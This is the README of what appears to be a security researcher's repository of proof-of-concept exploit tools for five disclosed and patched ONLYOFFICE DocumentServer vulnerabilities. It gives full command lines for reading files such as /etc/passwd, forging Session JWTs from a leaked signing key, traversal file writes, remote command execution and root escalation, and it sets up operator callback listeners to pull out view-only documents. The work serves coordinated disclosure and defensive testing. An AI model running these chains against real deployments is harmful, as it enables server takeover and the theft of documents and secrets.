# ONLYOFFICE Docs vulnerability PoCs

Python command-line tools for five vulnerabilities reported by [Jonah Burgess](https://linkedin.com/in/cryptocat) ([CryptoCat](https://github.com/Crypto-Cat)), Senior Security Researcher at [Rapid7](https://github.com/rapid7). The tools operate against an ONLYOFFICE DocumentServer over HTTP(S). Run them from an operator machine with the starting access listed below.

Read the [technical analysis on Rapid7's blog](https://rapid7.com/blog/post/ve-from-view-only-access-to-container-root-five-vulnerabilities-in-onlyoffice-docs-fixed).

| CVE | Vulnerability | Entry point |
| --- | --- | --- |
| [CVE-2026-113627](https://www.cve.org/CVERecord?id=CVE-2026-113627) | DocBuilder native file read and Session JWT signing-key disclosure | [editor_token_docbuilder_jwt_forgery.py](pocs/editor_token_docbuilder_jwt_forgery.py); [conditional WOPI entry](pocs/wopi_docbuilder_jwt_forgery.py) |
| [CVE-2026-110385](https://www.cve.org/CVERecord?id=CVE-2026-110385) | SaveFile conversion parameter injection and code execution | [docbuilder_savefile_params_rce.py](pocs/docbuilder_savefile_params_rce.py) |
| [CVE-2026-97727](https://www.cve.org/CVERecord?id=CVE-2026-97727) | downloadAs output-format traversal and arbitrary file write | [downloadas_format_traversal.py](pocs/downloadas_format_traversal.py); optional compositions in the JWT tools |
| [CVE-2026-113630](https://www.cve.org/CVERecord?id=CVE-2026-113630) | Sudo maintenance-helper command injection | Direct execution with `--root`; JWT tools with `--command` |
| [CVE-2026-113631](https://www.cve.org/CVERecord?id=CVE-2026-113631) | View-only document export through sendForm | [viewer_sendform_download_bypass.py](pocs/viewer_sendform_download_bypass.py) |

The research target was the official Linux container with package `onlyoffice-documentserver 9.4.0-129`. ONLYOFFICE confirmed that all five findings were fixed in 10.0; see the [10.0.0 security release notes](https://github.com/ONLYOFFICE/DocumentServer/blob/v10.0.0/CHANGELOG.md#security). The execution chains run as `ds`, or as `root` inside the DocumentServer container when the maintenance helper is used.

## Install

Use Python 3.10 or later on a POSIX operator system. The runtime dependency is Requests. Keep all files in `pocs/` together; entry points import the shared helpers beside them.

```sh
git clone https://github.com/jburgess-r7/onlyoffice-2026-pocs.git
cd onlyoffice-2026-pocs
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -r requirements.txt
python3 pocs/editor_token_docbuilder_jwt_forgery.py --help
```

## Starting tokens and network access

An **Editor JWT** is the signed opening configuration delivered to the browser by an integrating application. Save its compact token value to a local file, without JSON quotes. The DocBuilder entry was reproduced with `editorConfig.mode=view` and download disabled, where the tested Browser and Inbox validation use the same key. A deployment with separate keys may reject this entry.

A **Session JWT** is issued by DocumentServer during an editor session for reconnect/save operations. The standalone traversal tool needs this token type and a filesystem storage backend. That save permission branch rejects a token when both `download` and `print` are explicitly false. A missing permissions object or missing flag passes that particular check. The JWT-forgery tools set both flags to true.

The viewer-export tool needs a view-mode **DOCX Editor JWT** with `document.permissions.download=false`, a reachable source document, and an operator callback URL reachable from DocumentServer. It establishes its own Session JWT through the editor protocol.

Use a bare target origin such as `https://docs.example.test`; paths, query strings and embedded target credentials are rejected. All tools accept:

```text
--proxy http://127.0.0.1:8080
--ca-file /path/to/ca-bundle.pem
--insecure
--timeout 180
```

TLS verification is enabled by default. `--ca-file` and `--insecure` are mutually exclusive. Explicit proxy settings override environment proxy settings; otherwise Requests uses its normal environment settings. These options apply to result downloads as well as exploit requests. Result URLs may use a separate storage origin. Redirects are rejected, and no JWT is attached to result downloads. The download limit is 128 MiB; native-read DOCX XML extraction is capped at 256 MiB.

`--timeout` accepts a positive value up to 86,400 seconds and controls individual request waits and the command-output polling budget. It does not cancel a submitted target job. A stalled response can extend a phase because Requests timeouts limit socket inactivity rather than total transfer duration. Local payload inputs must be regular files and are limited to 128 MiB; token inputs are limited to 1 MiB.

## Read a file and forge a Session JWT

```sh
python3 pocs/editor_token_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --token-file /secure/editor.jwt \
  --read-file /etc/passwd \
  --read-output recovered-passwd.bin \
  --output-token forged-session.jwt
```

This recovers the selected file, reads `local.json`, obtains the configured Session signing key, forges a five-minute HS256 JWT and confirms that it can reserve a save key. The default selected file is `/etc/passwd`. Inline and file-backed Session keys are supported.

The token value is withheld from terminal output unless `--show-token` is supplied. Local recovered files, exported tokens, command output and configuration backups are created privately with mode `0600`. Existing outputs are refused; `--overwrite` permits replacement on successful recovery. A failed recovery leaves an existing output unchanged.

The native `GetFontBinary()` method can return the default font for a nonexistent path. The PoC compares against a per-job fallback read and refuses matching data. Consequently, a file whose contents exactly equal that default font cannot be recovered with this tool. An unavailable result does not prove that a path is absent. The behavior is visible in the [pinned native implementation](https://github.com/ONLYOFFICE/core/blob/v9.4.0.129/DesktopEditor/doctrenderer/embed/NativeControlEmbed.cpp#L76).

## Write a file

With a Session JWT:

```sh
python3 pocs/downloadas_format_traversal.py \
  --documentserver https://docs.example.test \
  --token-file forged-session.jwt \
  --target-path /tmp/assessment-note.txt \
  --data 'assessment file write'
```

The standalone tool reports request acceptance. It has no file-read primitive and cannot independently verify the destination. Empty writes are rejected because they do not take the vulnerable save branch. `--data-file` supplies binary bytes instead of UTF-8 text.

To compose the Editor-token entry with a write and verify the recovered bytes:

```sh
python3 pocs/editor_token_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --token-file /secure/editor.jwt \
  --read-output traversal-passwd.bin \
  --output-token traversal-session.jwt \
  --target-path /tmp/assessment-copy.bin \
  --write-data-file ./payload.bin
```

The destination must be writable by the DocumentServer service account. A selected remote path can overwrite an existing file. The tools leave that operator-selected file in place.

## Execute a command

The direct route uses SaveFile conversion parameter injection and a log4js appender.

The command examples below use `--runtime-absent` for the tested stock configuration,
where the file was known to be absent. Omit this flag when an existing file can be
backed up. An unavailable native read alone is not evidence of absence.

```sh
python3 pocs/docbuilder_savefile_params_rce.py \
  --documentserver https://docs.example.test \
  --token-file /secure/editor.jwt \
  --command 'id' \
  --runtime-absent \
  --artifacts-dir ./artifacts
```

This executes as the service account. Add `--root` to invoke the vulnerable sudo helper. The implemented SaveFile route uses log4js configuration; the published CVE-2026-110385 record describes a different execution route using DocumentBuilder executable settings.

This implementation also uses native file read for configuration backups and command-output recovery. If that primitive is blocked, it stops before delivering the execution payload. Such a failure does not independently establish whether the SaveFile conversion primitive is fixed.

When `Data/runtime.json` is readable, the tool backs up its bytes before replacing it. If it cannot be read, the tool stops before installing payloads. Use `--runtime-absent` only when you know that the file is absent: this explicitly authorizes creating it and removing it afterward. The native read alone cannot establish absence.

The Editor-token tool also composes token forgery, traversal writes and the root helper:

```sh
python3 pocs/editor_token_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --token-file /secure/editor.jwt \
  --command 'id' \
  --runtime-absent \
  --artifacts-dir ./artifacts
```

`--command` on either JWT tool means the traversal-to-root composition. It cannot be combined with a selected read or write operation. `--output-token` remains available; stdout is reserved for command bytes.

### Target changes and cleanup

Command execution installs an appender and shell script in `/var/www/onlyoffice/Data` and replaces `runtime.json`. Root mode also causes the maintenance helper to replace `api.js`. Coordinate command operations with every other writer of `runtime.json`, `api.js` and `api.js.tpl`, including administration and update jobs. The checks and writes are not atomic: concurrent changes can still be lost between a comparison and installation or restoration. Running these PoCs sequentially does not prevent races with other writers.

Each run writes a private local directory containing a manifest, available original configuration bytes, and recovered command output. The manifest lists generated target paths, including partial-installation artifacts. The default payload restores configuration bytes and removes its appender, script, lock, completion record and staged archive after the command. Root restoration waits until the helper has finished its final `api.js` replacement. The client compares readable backed-up files with their original bytes. For an assumed-absent runtime file, it records that the payload reported deletion and the file could not be independently read; this does not verify absence.

The command result remains at the exact `Data/r7-result-<run-id>` path in the manifest, mode `0600`, owned by `ds`. This location avoids sticky-directory write restrictions on root opening a service-owned file in `/tmp`. Remove it through your established target access when finished. Server-generated DocBuilder/save cache data remains subject to normal server expiry. Cleanup restores file contents; original ownership, permissions and timestamps are not captured by the read primitive. In particular, the root helper can change `api.js` ownership. Inspect and restore metadata through your established target access if required.

Before submitting a replacement, the client rereads the configuration and, in root mode, the API template; it aborts if a previously readable file changed or became unreadable. The traversal route repeats this check after staging the payloads, immediately before its runtime write. An unavailable runtime reread still relies on the operator's explicit absence assumption. The payload also compares `runtime.json` with its injected bytes and, in root mode, compares `api.js` with the expected helper rewrite before restoring them. If either differs, it leaves the changed file in place and reports incomplete cleanup. These comparisons do not close the races described above. If the appender never runs, configuration and payloads may remain installed. Inspect the manifest and backups after failure or interruption. Ctrl+C stops the client; a submitted remote command can continue and perform its own cleanup. `--keep-artifacts` deliberately retains the injected configuration and payloads for manual inspection.

## Conditional WOPI entry

WOPI must be enabled. The attacker-controlled metadata source must pass the deployment's source restrictions and be reachable from DocumentServer. The built-in source listener supplies the metadata needed to obtain the empty-key Browser JWT.

```sh
python3 pocs/wopi_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --public-wopi-src http://operator.example.test:18084/wopi/ \
  --listen-host 0.0.0.0 \
  --listen-port 18084 \
  --read-output wopi-passwd.bin \
  --output-token wopi-session.jwt
```

The public source URL must end in `/`. This mode requires no pre-existing DocumentServer JWT. It supports the same optional `--target-path`/write-data arguments and root `--command` composition as the Editor-token tool. Root commands have the same backup, cleanup and `--runtime-absent` behavior described above.

For direct HTTPS delivery, provide `--tls-cert` and `--tls-key` with a certificate trusted by DocumentServer. Alternatively, terminate HTTPS at a reverse proxy and forward the public source path to the local HTTP listener. In that case, omit listener TLS options and set the public HTTPS URL and local bind port separately. `--insecure` changes the operator's target verification; it does not change what certificates DocumentServer trusts.

## Export a view-only document

```sh
python3 pocs/viewer_sendform_download_bypass.py \
  --documentserver https://docs.example.test \
  --token-file /secure/viewer.jwt \
  --callback-url http://operator.example.test:18085/callback \
  --listen-host 0.0.0.0 \
  --listen-port 18085 \
  --output reconstructed.docx
```

The callback URL is a public path prefix: the tool appends an unpredictable per-run suffix and withholds that suffix from progress messages. The listener must be reachable from DocumentServer at that complete path. The tool opens the view-only document, receives a Session JWT, reconnects with the replacement callback and invokes `sendForm`. It discards callbacks that started before the export request was armed, then requires the expected document key and status 6 before downloading the returned document and checking for the DOCX document part.

The random path and request timing correlate a callback with the run; they do not cryptographically authenticate its sender. The PoC does not verify callback JWT signatures because it has no Outbox signing key. Anyone who learns the per-run path and document key could still forge a callback and URL. Use trusted callback infrastructure, protect its traffic and logs, and verify callback provenance independently when assessing the result. A matching document key and valid DOCX structure alone are not proof of server origin.

The result is a reconstructed DOCX. The research demonstrated disclosure of custom XML, custom properties and field instructions not displayed in the viewer.

Direct HTTPS and reverse-proxy delivery use the same `--tls-cert`/`--tls-key` options and bind/public URL distinction as WOPI. For example, an HTTPS proxy on port 443 can forward the `/callback/` subtree to the HTTP listener on port 18085, preserving the generated path suffix unchanged. An exact-match rule for `/callback` alone will not work. Both listeners close when their operation ends. The viewer tool does not restore application callback state; close the assessment session and account for any callback or save activity it caused.

## Output and exit status

Progress and diagnostics go to stderr. Command stdout contains the recovered command bytes. `--show-token` prints a JWT to stdout only in a non-command JWT operation.

| Status | Meaning |
| --- | --- |
| `0` | Requested operation completed; a standalone write confirms acceptance only |
| `1` | Input, transport, authentication, exploit or restoration-verification failure |
| `2` | Invalid CLI syntax |
| `3` | Command output recovered with a nonzero remote command status |
| `4` | Command output recovered, but the payload reported incomplete cleanup |
| `130` | Interrupted with Ctrl+C |

Authentication rejection does not by itself identify a fixed version. WOPI restrictions, separate signing keys, storage configuration and network failures can also prevent a chain.

## Credit

Ssani4 previously reported `GetFontBinary`, arbitrary file reads and a Session-JWT entry to DocBuilder in [DocumentBuilder issue 147](https://github.com/ONLYOFFICE/DocumentBuilder/issues/147). Rapid7's work reproduced the native read on 9.4.0-129, established the view-only Editor-JWT entry and signing-key forgery, and demonstrated the subsequent findings and chains.
